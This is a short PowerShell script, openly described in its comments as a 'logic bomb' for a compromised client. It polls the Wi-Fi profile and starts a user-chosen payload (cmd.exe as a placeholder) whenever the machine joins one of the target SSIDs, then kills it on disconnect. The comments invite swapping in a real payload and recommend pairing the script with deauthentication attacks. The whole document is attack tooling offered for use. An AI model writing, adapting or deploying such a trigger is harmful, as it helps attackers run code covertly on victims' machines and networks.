<# Please replace the SSIDs here with the target's #>
<# Please also feel free to swap out the payload with your own #>
<# Essentially, this logic bomb will execute the payload once the target network is connected to by the compromised client #>
<# As well, some additional logic is in here to terminate the process upon disconnect from the target networks #>
<# This script works wonders if paired with deauthentication pivots #>

$desiredNetworks = @("targetSSID1", "targetSSID2")
$executablePath = "cmd.exe"
$process = $null

while ($true) {
    $connectedNetwork = Get-NetConnectionProfile | Where-Object { $_.InterfaceAlias -like "*Wi-Fi*" }

    if ($connectedNetwork -and $desiredNetworks -contains $connectedNetwork.Name) {
        if (-not $process) {
            $process = Start-Process -FilePath $executablePath -PassThru
        }
    }
    else {
        if ($process) {
            $process | Stop-Process -Force
            $process = $null
        }
    }

    Start-Sleep -Seconds 10
}
